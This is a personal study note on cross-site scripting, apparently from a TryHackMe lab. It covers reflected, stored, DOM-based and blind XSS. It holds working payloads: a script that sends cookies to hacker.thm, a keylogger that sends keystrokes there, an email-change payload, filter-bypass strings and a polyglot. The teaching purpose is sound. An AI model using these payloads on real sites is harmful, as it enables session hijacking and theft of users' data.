# Cross-site Scripting  (XSS)

An injection attack where malicious JavaScript gets injected into a web application with the intention of being executed by other useres. 

Cross-site Scripting vulnerabities are very common, and have been found in Steam chat, HackerOne, Shopify and Infogram. 

# XSS Payloads

## Whats a payload?
In XSS, the payload is the JavaScript code we wish to be executed on the targets computer. There are two parts to the payload, the *intention* and the *modification*

The Intention: What you want to JS to actually do

The Modification: Changes to the code we need to make it execute as every situation is different

## Proof of Concept:

Heres the simplest payload when all you want to do is demonstrate that you *can* achieve XSS on a websites. Just returns an alert:

`<script>alert('XSS');</script>`

## Session Stealing

User session details like login tokens are often kept in cookies on the targets machine.

The below JavaScript takes the target's cookie, encodes in base64 for transmission and then posts it to a website under the hacker's control to be logged:

`<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>`


Once the hacker has these cookies, they can take over the target's session and be logged in as the user.

## Key Logger:

This code acts as a keylogger, forwarding any typed text to a website under attacker control.

`<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>`


## Business Logic:

This payload is more spefic. This would be calling a particular network resource or a JS function. Imagine a JS function for changing the user's email address called `user.changeEmail()`. A payload could look like this:

`<script>user.changeEmail('attacker@hacker.thm');</script>)`


# Reflected XSS

Reflected XSS happens when user-supplied data in an HTTP request is included in the webpage without any validation.

The content of the error messages gets taken from the *error* parameter in the query string and is built directly into the page source. 

## Example Scenerio

A website allows user input, and if the input is incorect, a error message gets taken from the error parameter in the query string and is built directly into the page sources:

![Image 1 aint load](images/reflectedXSS1.png)

The application doesn't check the contents of the error parameter, which allows the attacker to insert malicious code.

![Image 2 aint load](images/reflectedXSS2.png)

The vulnerability can be used as per the scenerio in this image:

![Image 3 aint load](images/reflectedXSS3.png)

## Potential Impact

The attacker could send links or embed links into an iframe on a nother website containing a JS payload to get potential victims getting them to execute code on there browser revealing session or customer info.

## Testing for Reflected XSS

Test every possible point of entry, including:

- Parameters in the URL Query String
- URL File Path
- Sometimes HTTP Headers (although unlikely exploitable in practice)

Once you've found data reflected in the web app, you'll then need to confirm that you can succesfully run your JS payload. Your payload will be dependent on where in the application your code is reflected.

# Stored XSS 

As the name infers, the XSS payload is stored on the web application (in a database, for example) and gets ran when other users visit the site or web page. 

## Example Scenario

Say theres a blog site that allows comments to be posted. The comments arn't checked for wether they contain JavaScript or filter out malicious code. If we post a comment containg JavaScript, this will be stored in the database, and every other user now visitng the article will have the JavaScript run on they're browser.

![Stored XSS image aint load](images/StoredXSS1.png)

## Impact

The JS could redirct users to another site, steal session cookies, or perform other site actions while acting as the visiting user.

## Testing for Stored XSS:

Test every possible point for entry where it seems like data is stored then shown back in areas that other users have access to; a small example of these could be:

- Comments on a blog
- User profile information
- Website Listing

Sometimes devolpers think limiting input values on the client-side is good enough protection, so changing values to something the web application wouldn't be expected is a good source of discovering stored XSS, for example, an age field that is expecting an integer from a dropdown menu, but instead, you manually send the request rather than using the form allowing you to try malicious payloads.

Once you've found some data which is being stored in the web app, youll need to confirm you can succesfully run your JavaScript payload, dependent on where in the app your code is reflected.

# DOM Based XSS

## Whats the DOM?

DOM stands for Document Object Model and is a programming interface for HTML/XML docs. It represents the page so that programs can change document structure, style, and content. A web page is a document, and this document can either be displayed in the browsers window or as HTML source. 

A diagram of the HTML DOM:

![DOM image aint load](images/HTMLDOM.png)


## Exploiting the DOM

DOM Based XSS is where JS execution happens directly in the browser without any new pages being loaded or data submitted to backend code. Execution occurs when the site's JS code acts on input or user interaction.

## Example Scenario

The website's JS gets the contents from `window.location.hash` parameter and then writes it onto the page's currently being veiwed section. Contents of the hash are not checked for malicious code, allowing attackers to inject JavaScript of their choosing onto the webpage.

## Impact

Crafted links could be sent to potential victims, redirecting them to another website or steal content from the page or user's session.

## Testing for DOM Based XSS

Look for parts of code that access certian variables that an attacker can have control over, such as `window.location.x` parameters. 

When you've found these peices of code, you'd then need to see how they are handled and whether the values are ever written to the web page's DOM or passed to unsafe JavaScript methods such as `eval()`

# Blind XSS

Similar to Stored XSS, payload gets stored on the website for another user to veiw, but in this case you can't see the payload working or test it against yourself first.

## Example Scenario

A website has a contact form where you can message a member of staff. The message content doesn't get checked for any malicious code, which allows attacker's to enter what they want. The messages then get turned into support tickets which staff view on a private web portal.

## Impact

With the right payload, the malicious JS could reveal the staff portal URL, the staff member's cookies, and even the contents of the portal page that is being viewed. Now the attacker could potentially hijack the staff member's session and get access to the private portal.

## Testing for Blind XSS

When testing for Blind XSS, you should add a call back to your payload (typically an HTTP request) so you can know if your code got executed.

A popular tool for Blind XSS attacks is [xsshunter](https://xsshunter.com/#/)

While you can handcode your own tool in JS, this tool automatically captures cookies, URLs, page contents and more. 

# Perfecting Payloads

Here's a couple examples of XSS exploits:

## Example 1:

Say we're asked to enter our name in an input feild:

![image not found](images/perfectingpayload1.png)

However, your input is reflected in the input tag:

![image not found](images/perfpayload2.png)
It wouldn't work for us to just put in the `<script>alert("THM);</script>` in the input box, so we can use the following payload:

```
"><script>alert('THM');</script>
```

The important part is the `">` which closes the value parameter and then closes the input tag.

This now closes the input tag properly so the JS can run:

![image not found](images/perfpayload3.png)

## Example 2:
Same as example two, but now your name gets reflected inside an HTML tag, this time the textarea tag:
We need to close the `<textarea>` tag. We can do this with the following payload:

```
</textarea><script>alert('THM');</script>
```

### So this:

![image not found](images/perfpayload4.png)
### Turns into this:
![image not found](images/perfpayload5.png)


## Example 3:

Lets say your input (name) is reflected like this:

![image not found](images/perfpayload6.png)

You need to escape the JS command so you can run code. This payload works:

```
';alert('THM');//
```
The `'` closes the feild specifying the name, the `;` ends the current command, and the `//` at the end makes anything after a comment.:

![image not found](images/perfpayload7.png)

## Example 4:

Similar to the previous example, your name is reflected in the same place. However, the word `script` gets removed: 

![image not found](images/perfpayload8.png)

Well, we know script is removed from the payload, but we can trick it by typing:

```
<sscriptcript>alert('THM');</sscriptcript>
```

The `script` tags will be removed:
```
<script>alert('THM');</script>
```

## Example 5:

Similar to example 1. where we excape the value attribute of an input tag, we can try:

```
"><script>alert('THM');</script>
```

It don't work, because ">" and "<" are filtered out, preventing us from escaping the IMG tag:

![image not found](images/perfpayload9.png)

We can take advantage of additional IMG tag attributes, like the onload event:

```
/images/cat.jpg" onload="alert('THM'); 
```

Result:

![image not found](images/perfpayload10.png)

Easy money.

## Polyglots:

An XSS polyglot is a string of text which can escape attributes, tags and bypass filters all in one. You could have used the below polyglot on all 5 examples, and it would have executed all the code succesfully:

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
```
